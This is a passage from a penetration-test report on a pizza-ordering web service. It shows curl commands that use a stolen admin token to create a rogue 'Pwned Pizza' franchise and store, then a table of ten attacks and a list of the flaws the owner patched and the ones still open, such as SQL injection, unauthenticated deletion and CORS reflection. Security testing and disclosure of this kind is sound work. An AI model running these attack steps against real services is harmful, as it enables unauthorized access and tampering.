  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"name":"Pwned Pizza","admins":[{"email":"pentest3@test.com"}]}'
```

**Response:**

```json
{
  "name": "Pwned Pizza",
  "admins": [{ "email": "pentest3@test.com", "id": 22, "name": "pentest3" }],
  "id": 4
}
```

> Franchise **"Pwned Pizza"** (ID 4) created with pentest3 as franchise admin.

**Step 3b — Add store to franchise:**

```bash
curl -s -X POST "https://pizza-service.marcosotomarino.com/api/franchise/4/store" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"name":"Hacker HQ"}'
```

**Response:**

```json
{ "id": 2, "franchiseId": 4, "name": "Hacker HQ" }
```

> Store **"Hacker HQ"** (ID 2) added to the "Pwned Pizza" franchise.

**Final state — franchises after attack:**

```json
{
  "franchises": [
    { "id": 1, "name": "My Pizza Franchise", "stores": [{ "id": 1, "name": "Main Store" }] },
    { "id": 4, "name": "Pwned Pizza", "stores": [{ "id": 2, "name": "Hacker HQ" }] },
    { "id": 2, "name": "SLC", "stores": [] }
  ]
}
```

> "Pwned Pizza" with "Hacker HQ" store now exists alongside Marco's legitimate
> franchises. An attacker with this level of access could also delete all
> existing franchises, modify the menu, access all order data, or lock out
> every user in the system.

---

## Summary of Findings

| #   | Attack                           | OWASP Category                | Severity | Exploitable? |
| --- | -------------------------------- | ----------------------------- | -------- | ------------ |
| 1   | SQL Injection (Priv. Esc.)       | A03 Injection                 | 4        | YES          |
| 2   | Unauth Franchise Deletion        | A01 Broken Access Control     | 4        | YES          |
| 3   | Zero/Negative Price Orders       | A04 Insecure Design           | 3        | YES          |
| 4   | Info Disclosure + Misconfig      | A05 Security Misconfiguration | 2        | YES          |
| 5   | JWT Forgery (Default Secret)     | A02 Cryptographic Failures    | 0        | NO (patched) |
| 6   | CORS Cross-Origin Exploitation   | A05 Security Misconfiguration | 3        | YES          |
| 7   | SQLi via LIMIT/OFFSET Params     | A03 Injection                 | 2        | YES          |
| 8   | SQLi Full Database Extraction    | A03 Injection                 | 4        | YES          |
| 9   | Frontend Admin Disclosure        | A01 Broken Access Control     | 2        | YES          |
| 10  | Full Kill Chain (Admin Takeover) | A03 Injection / A01 BAC       | 4        | YES          |

## What Marco Patched vs. What Remains Open

### Patched (credit to Marco)

1. **Default admin credentials** — All default accounts (`a@jwt.com`, `d@jwt.com`,
   `f@jwt.com`, `t@jwt.com`) removed. Default credential attacks fail.
2. **Error message enumeration** — Both wrong password and unknown user return the
   same "unknown user" error. User enumeration via error content is blocked.
3. **JWT secret** — Changed from the default `dev-secret-key-change-in-production`.
   Forgery with the default and 10 common secrets all rejected.
4. **Store deletion** — `DELETE /api/franchise/:id/store/:storeId` requires
   authentication (unlike franchise deletion).
5. **User update IDOR** — `PUT /api/user/:otherId` rejects requests where the
   authenticated user's ID doesn't match the URL parameter.
6. **Coverage instrumentation** — No `__coverage__` or istanbul markers in the
   production JS bundle.

### Still Vulnerable

1. **SQL Injection (User Update)** — `PUT /api/user` uses string concatenation.
   Allows privilege escalation (Attack 1), full database extraction including
   password hashes (Attack 8), admin account takeover (Attack 10), and schema
   enumeration. This is the single most critical vulnerability — fixing it
   blocks Attacks 1, 8, and 10 entirely.
2. **SQL Injection (LIMIT/OFFSET)** — `page` parameter on `GET /api/order` and
   `GET /api/franchise` interpolated into SQL (Attack 7).
3. **Unauthenticated Franchise Deletion** — `DELETE /api/franchise/:id` has no
   auth middleware at all (Attack 2).
4. **Client-Side Price Trust** — Server accepts any price including zero and
   negative values without validation (Attack 3).
5. **CORS Origin Reflection** — Any origin reflected with `credentials: true`,
   enabling cross-origin credential theft (Attack 6).
6. **Stack Trace Leakage** — All errors return full Node.js stack traces with
   internal file paths and module versions (Attacks 4, 7).
7. **Database Hostname Exposed** — `/api/docs` config section leaks the full
   RDS hostname (Attack 4).
8. **No JWT Expiry** — Tokens have no `exp` claim and never expire (Attack 5).
9. **Missing Security Headers** — No CSP, HSTS, X-Frame-Options on backend
   or frontend. `X-Powered-By: Express` still present (Attack 4).
10. **No Rate Limiting** — Login, registration, and order endpoints accept
    unlimited requests with no throttling or lockout.
11. **Frontend Admin Route Exposed** — Admin dashboard renders for any user;
    `robots.txt` advertises sensitive paths (Attack 9).
